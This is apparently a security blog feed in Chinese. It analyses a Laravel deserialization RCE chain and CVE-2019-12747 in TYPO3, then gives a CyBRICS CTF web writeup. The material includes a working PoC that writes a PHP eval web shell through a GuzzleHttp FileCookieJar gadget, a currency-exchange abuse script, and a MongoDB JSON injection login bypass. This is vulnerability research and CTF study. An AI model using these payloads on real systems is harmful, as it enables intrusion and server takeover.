class="line">Illuminate\Contracts\Console\Kernel</span><br></pre></td></tr></table></figure></p><p>首先进入：<br><img src="/images/2019-07-18-19-16-16.png" alt=""><br>跟进make:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;deferredServices[$abstract]) &amp;&amp; ! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadDeferredProvider($abstract);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::make($abstract, $parameters);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>再跟进其父类的make:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resolve($abstract, $parameters);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>跟进resolve：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>那么此时发现$concrete的值来自于getConcrete($abstract):<br>vendor/laravel/framework/src/Illuminate/Container/Container.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br></pre></td></tr></table></figure></p><p>跟进getConcrete：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getConcrete</span><span class="params">($abstract)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_null($concrete = <span class="keyword">$this</span>-&gt;getContextualConcrete($abstract))) &#123;</span><br><span class="line">            <span class="keyword">return</span> $concrete;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If we don't have a registered resolver or concrete for the type, we'll just</span></span><br><span class="line">        <span class="comment">// assume each type is a concrete name and will attempt to resolve it as is</span></span><br><span class="line">        <span class="comment">// since the container should be able to resolve concretes automatically.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;bindings[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindings[$abstract][<span class="string">'concrete'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $abstract;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们注意到，如果bindings[$abstract]存在，则会返回bindings[$abstract][‘concrete’]。<br>而bindings是类Container的属性，同时注意到类Container中也有可以RCE的call方法。那么现在思路很清晰：我们可以任意实例化类Container的子类，这样在其子类调用call的时候，会触发类Container的call方法，那么即可达成RCE。<br>而这样的类选择类Container的子类：Illuminate\Foundation\Application再好不过。<br>而$abstract的值为Illuminate\Contracts\Console\Kernel。<br>那么此时我们容易知道$bindings只要存在键名为Illuminate\Contracts\Console\Kernel的数组，就能进入该if条件句，那么我们只要按如下进行构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>就可以保证返回值为Illuminate\Foundation\Application。<br>接下来会判断是否可以build：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">            $object = <span class="keyword">$this</span>-&gt;build($concrete);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>我们跟进isBuildable：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isBuildable</span><span class="params">($concrete, $abstract)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $concrete === $abstract || $concrete <span class="keyword">instanceof</span> Closure;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>如果$concrete和$abstract相等则可以build。<br>但我们现在明显：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="string">'Illuminate\Foundation\Application'</span>;</span><br><span class="line">$abstract = <span class="string">'Illuminate\Contracts\Console\Kernel'</span>;</span><br></pre></td></tr></table></figure></p><p>所以会进入else分支，继续make。<br>而make时，我们注意到：<br><img src="/images/2019-07-18-22-35-43.png" alt=""><br>而else分支传入make的值为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br></pre></td></tr></table></figure></p><p>这样一来直接就构成了后面：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br></pre></td></tr></table></figure></p><p>这次bindings数组里并没有键名为Illuminate\Foundation\Application的数组里，于是直接回返回$abstract的值，这样一来就达到了实例化Illuminate\Foundation\Application的目的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = $abstract = <span class="string">'Illuminate\Foundation\Application'</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-18-21-54-57.png" alt=""><br>最后则可以让最后的$this-&gt;app[Kernel::class]的值变为Illuminate\Foundation\Application。为了更加直观，我们在这个位置做如下改写：<br><img src="/images/2019-07-18-21-58-57.png" alt=""><br><img src="/images/2019-07-18-22-00-19.png" alt=""><br>紧接着会调用Illuminate\Foundation\Application父类Illuminate\Container\Container的call方法：<br>vendor/laravel/framework/src/Illuminate/Container/Container.php<br><img src="/images/2019-07-18-18-33-58.png" alt=""><br><img src="/images/2019-07-18-22-03-01.png" alt=""><br>最后走入这个call_user_func_array，而$callback是我们可以控制的system，而getMethodDependencies()，我们跟进：<br><img src="/images/2019-07-18-22-04-15.png" alt=""><br>最后会返回我们需要的参数id，那么这样一来，即可RCE成功：<br><img src="/images/2019-07-18-22-04-56.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>laravel整个反序列化RCE链用的非常漂亮：<br>1.类PendingCommand 利用 <strong>destruct触发run()方法<br>2.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 构造数组<br>3.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 利用 </strong>get()魔法方法满足mockConsoleOutput<br>4.利用任意实例化对象，实例化Illuminate\Foundation\Application<br>5.调用call触发父类call方法RCE</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;laravel序列化&quot;&gt;&lt;a href=&quot;#laravel序列化&quot; class=&quot;headerlink&quot; title=&quot;laravel序列化&quot;&gt;&lt;/a&gt;laravel序列化&lt;/h2&gt;&lt;p&gt;Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Fr
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-12747:TYPO3 CMS Deserialization RCE Vulnerability</title>
    <link href="http://skysec.top/2019/07/22/CVE-2019-12747-TYPO3-CMS-Deserialization-RCE-Vulnerability/"/>
    <id>http://skysec.top/2019/07/22/CVE-2019-12747-TYPO3-CMS-Deserialization-RCE-Vulnerability/</id>
    <published>2019-07-22T13:47:12.000Z</published>
    <updated>2019-07-24T07:07:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正好在分析反序列化漏洞，看到最近TYPO3 CMS新爆出了一个CMS的反序列化漏洞：CVE-2019-12747，随机来分析一下：<br><img src="/images/2019-07-22-21-51-12.png" alt=""><br>漏洞范围：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TYPO3 8.x ~ 8.7.26</span><br><span class="line">TYPO3 9.x ~ 9.5.7</span><br></pre></td></tr></table></figure></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞触发点，在于page生成页面：<br><img src="/images/2019-07-24-15-01-57.png" alt=""><br>传入的form内容会走到如下流程：<br>typo3/sysext/backend/Classes/Controller/EditDocumentController.php<br><img src="/images/2019-07-24-09-04-34.png" alt=""><br>我们跟进最后的compile函数：<br>typo3/sysext/backend/Classes/Form/FormDataGroup/OrderedProviderList.php<br><img src="/images/2019-07-24-09-06-15.png" alt=""><br>再跟进最后的addData函数：<br>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseLanguageRows.php，第63~68行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($result[<span class="string">'processedTca'</span>][<span class="string">'ctrl'</span>][<span class="string">'transOrigDiffSourceField'</span>])</span><br><span class="line">    &amp;&amp; !<span class="keyword">empty</span>($result[<span class="string">'databaseRow'</span>][$result[<span class="string">'processedTca'</span>][<span class="string">'ctrl'</span>][<span class="string">'transOrigDiffSourceField'</span>]])</span><br><span class="line">) &#123;</span><br><span class="line">    $defaultLanguageKey = $result[<span class="string">'tableName'</span>] . <span class="string">':'</span> . (int)$result[<span class="string">'databaseRow'</span>][<span class="string">'uid'</span>];</span><br><span class="line">    $result[<span class="string">'defaultLanguageDiffRow'</span>][$defaultLanguageKey] = unserialize($result[<span class="string">'databaseRow'</span>][$result[<span class="string">'processedTca'</span>][<span class="string">'ctrl'</span>][<span class="string">'transOrigDiffSourceField'</span>]]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>容易发现触发反序列化的位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result[<span class="string">'defaultLanguageDiffRow'</span>][$defaultLanguageKey] = unserialize($result[<span class="string">'databaseRow'</span>][$result[<span class="string">'processedTca'</span>][<span class="string">'ctrl'</span>][<span class="string">'transOrigDiffSourceField'</span>]])</span><br></pre></td></tr></table></figure></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>那么找到触发链后，我们怎么寻找可利用的exp链呢？<br>我们知道魔法方法<strong>destruct()是反序列化最好的入口，不难检索到如下类中：<br>cms-base-distribution/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php<br><img src="/images/2019-07-24-10-55-12.png" alt=""><br>注意到该类触发</strong>destruct()魔法方法时，会调用save函数，我们跟进：<br><img src="/images/2019-07-24-10-57-27.png" alt=""><br>注意到关键的file_put_contents函数，那么写入内容我们观察，可以看到来自于前面的cookie：<br><img src="/images/2019-07-24-10-58-05.png" alt=""><br>那么我们只需要控制storeSessionCookies属性即可，我们跟进：<br>cms-base-distribution/vendor/guzzlehttp/guzzle/src/Cookie/CookieJar.php<br><img src="/images/2019-07-24-11-00-15.png" alt=""><br>发现有一些限制，并且如果想控制该值，我们需要用到FileCookieJar的父类：CookieJar：<br><img src="/images/2019-07-24-14-51-54.png" alt=""><br>我们跟进setCookie():<br><img src="/images/2019-07-24-14-55-15.png" alt=""><br>跟进一下validate()函数：<br><img src="/images/2019-07-24-14-56-28.png" alt=""><br>发现我们的需求并不难满足，只要让name，value，domain不为空即可。<br>我们跟进最后的SetCookie类：<br><img src="/images/2019-07-24-13-51-57.png" alt=""><br>其构造函数会将defaults的值换给data：<br><img src="/images/2019-07-24-14-57-48.png" alt=""><br>但在构造过程中，需要注意：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($cookie-&gt;getExpires() || $allowSessionCookies) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$cookie-&gt;getDiscard()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们需要满足条件，所以必须设置Expires，并且将Discard设置为false。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>那么最后只剩下构造我们的Poc了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"cms-base-distribution/vendor/autoload.php"</span>;</span><br><span class="line">$obj = <span class="keyword">new</span> FileCookieJar(<span class="string">'/var/www/html/sky.php'</span>);</span><br><span class="line">$payload = <span class="string">'&lt;?php @eval($_POST[sky]);?&gt;'</span>;</span><br><span class="line">$obj-&gt;setCookie(<span class="keyword">new</span> SetCookie([</span><br><span class="line">    <span class="string">'Name'</span> =&gt; <span class="string">'sky'</span>,</span><br><span class="line">    <span class="string">'Domain'</span> =&gt; $payload,</span><br><span class="line">    <span class="string">'Value'</span>=&gt; <span class="string">'sky'</span>,</span><br><span class="line">    <span class="string">'Expires'</span> =&gt; time()]));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>即可得到exp。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>该CVE较之前的Laravel的框架反序列化漏洞，简单不少。主要用到了常用RCE package GuzzleHttp。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;正好在分析反序列化漏洞，看到最近TYPO3 CMS新爆出了一个CMS的反序列化漏洞：CVE-2019-12747，随机来分析一下：&lt;br&gt;&lt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CyBRICS CTF Quals 2019 Web Writeup</title>
    <link href="http://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/"/>
    <id>http://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/</id>
    <published>2019-07-22T02:11:10.000Z</published>
    <updated>2019-08-02T08:20:23.023Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末参加了LCBC主办的2019 CyBRICS CTF Quals，在金砖五国中，获得了top5的成绩，以下是web的题解。</p><h2 id="Bitkoff-Bank"><a href="#Bitkoff-Bank" class="headerlink" title="Bitkoff Bank"></a>Bitkoff Bank</h2><p><img src="/images/2019-07-22-10-37-35.png" alt=""><br>点一次mine btc，获得0.0000000001 BTC，而购买auto-miner需要0.1 USD。<br>购买auto-miner后，我们的网页会多出这样一个script，每秒帮我们点击1000次，但实际上并非1秒能获得这么多BTC：<br><img src="/images/2019-07-22-10-37-12.png" alt=""><br>然后获取flag需要1USD，显然即便依靠auto-miner也是遥遥无期的。<br>通过做题的经验，给了的功能一般不会白给，我们测试一下转换功能，发现不断将BTC转成USD，将USD转成BTC，就会因为汇率问题就会不断加钱，写脚本即可：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://95.179.148.72:8083/index.php'</span></span><br><span class="line">cookie = &#123;</span><br><span class="line"><span class="string">'name'</span>:<span class="string">'yyplsky'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'yyplskycool'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetUSD</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url,cookies=cookie,timeout=<span class="number">3</span>)</span><br><span class="line">res = r.content</span><br><span class="line">res = re.findall(<span class="string">r'&lt;b&gt;([0-9\.]*)&lt;/b&gt;&lt;br&gt;'</span>,res)</span><br><span class="line"><span class="keyword">return</span> res[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">USD_to_BTC</span><span class="params">(USD)</span>:</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'from_currency'</span>:<span class="string">'usd'</span>,</span><br><span class="line"><span class="string">'to_currency'</span>:<span class="string">'btc'</span>,</span><br><span class="line"><span class="string">'amount'</span>:USD</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(url,data=data,cookies=cookie,timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetBTC</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url,cookies=cookie,timeout=<span class="number">3</span>)</span><br><span class="line">res = r.content</span><br><span class="line">res = re.findall(<span class="string">r'&lt;b&gt;([0-9\.]*)&lt;/b&gt;&lt;br&gt;'</span>,res)</span><br><span class="line"><span class="keyword">return</span> res[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BTC_to_USD</span><span class="params">(BTC)</span>:</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'from_currency'</span>:<span class="string">'btc'</span>,</span><br><span class="line"><span class="string">'to_currency'</span>:<span class="string">'usd'</span>,</span><br><span class="line"><span class="string">'amount'</span>:BTC</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(url,data=data,cookies=cookie,timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">USD = GetUSD()</span><br><span class="line"><span class="keyword">print</span> USD</span><br><span class="line">USD_to_BTC(USD)</span><br><span class="line">BTC = GetBTC()</span><br><span class="line"><span class="keyword">print</span> BTC</span><br><span class="line">BTC_to_USD(BTC)</span><br></pre></td></tr></table></figure></p><p>通过来回转钱，跑差不多十分钟就够$1 USD，可以购买flag了</p><h2 id="Caesaref"><a href="#Caesaref" class="headerlink" title="Caesaref"></a>Caesaref</h2><p>这题本来设置的难度为hard，但因为出现了非预期，我们发出的请求可以在服务器收到，但回带上admin cookie，所以我们可以直接更改cookie进入admin页面，导致我们可以直接点击show flag获取flag。<br>修复版本见下面的Fixaref，这题就不再详解。</p><h2 id="NopeSQL"><a href="#NopeSQL" class="headerlink" title="NopeSQL"></a>NopeSQL</h2><p>扫描发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/.git/HEAD</span><br></pre></td></tr></table></figure></p><p>进行githacker源码泄露，拿到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHacker.py http://173.199.118.226/.git/</span><br></pre></td></tr></table></figure></p><p>简单审视代码，发现是php为后端，mongodb作为数据库。<br>题目分为两部分，第一部分是需要先成功登入<br><img src="/images/2019-07-22-10-49-58.png" alt=""><br>我们注意到在sql拼接处，为加任何过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br></pre></td></tr></table></figure></p><p>题目会直接拼接我们传入的username和password。但因为后续有json_decode，所以导致我们并不能使用传统方法进行Bypass:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$document = $collection-&gt;findOne(json_decode($raw_query));</span><br></pre></td></tr></table></figure></p><p>这里我们的想法本来为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password[$ne]=1</span><br></pre></td></tr></table></figure></p><p>这样即查找用户名为admin，密码不为1的用户，那么显然管理员密码不可能为1，那么可以成功匹配到管理员用户，但这里由于json_decode，我们这样直接传参不会奏效，同时也不能使用//进行注释闭合。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line">$username=<span class="string">'admin'</span>;</span><br><span class="line">$password[$ne]=<span class="string">'1'</span>;</span><br><span class="line">$raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">var_dump(json_decode($raw_query));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-22-10-54-55.png" alt=""><br>但我们可以构造出如下脚本，来生成我们想要的exp：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line">$password = <span class="keyword">array</span>(<span class="string">'$ne'</span> =&gt; <span class="string">'1'</span>);</span><br><span class="line">$res = <span class="keyword">array</span>(<span class="string">'username'</span> =&gt; <span class="string">'admin'</span>, <span class="string">'password'</span> =&gt; $password);</span><br><span class="line">var_dump(json_encode($res));</span><br></pre></td></tr></table></figure></p><p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:&quot;1&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>所以我们的目标是构造出这样的exp，即可解析出password[$ne]=1。<br>那么我们在password字段注入即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa&quot;, &quot;password&quot;: &#123;&quot;$ne&quot;: &quot;test&quot;&#125;, &quot;username&quot;: &quot;admin</span><br></pre></td></tr></table></figure></p><p>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin</span><br><span class="line">password = aaa&quot;, &quot;password&quot;: &#123;&quot;$ne&quot;: &quot;test&quot;&#125;, &quot;username&quot;: &quot;admin</span><br></pre></td></tr></table></figure></p><p>这样可以得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;aaa&quot;, &quot;password&quot;: &#123;&quot;$ne&quot;: &quot;test&quot;&#125;, &quot;username&quot;: &quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>这样一来，我们即可搜索到满足条件的管理员用户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;password&quot;: &#123;&quot;$ne&quot;: &quot;test&quot;&#125;, &quot;username&quot;: &quot;admin&quot;</span><br></pre></td></tr></table></figure></p><p>登入后，来到第二个挑战：<br><img src="/images/2019-07-22-11-03-33.png" alt=""><br>通过查询资料得知，在mongodb的aggregate中，可以使用$cond进行条件语句：<br><img src="/images/2019-07-22-11-05-06.png" alt=""><br>单个条件可以为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[$cond][if][$eq]</span><br></pre></td></tr></table></figure></p><p>如果要使用两个条件，则并列即可：<br><img src="/images/2019-07-22-11-06-04.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[$cond][if][$eq]</span><br><span class="line">[$cond][if][$eq]</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-22-11-06-30.png" alt=""><br>那么我们可以利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if then else</span><br></pre></td></tr></table></figure></p><p>比如当我们匹配到flags时候，就将其移除：<br><figure class="highlight plain"><table><tr><td 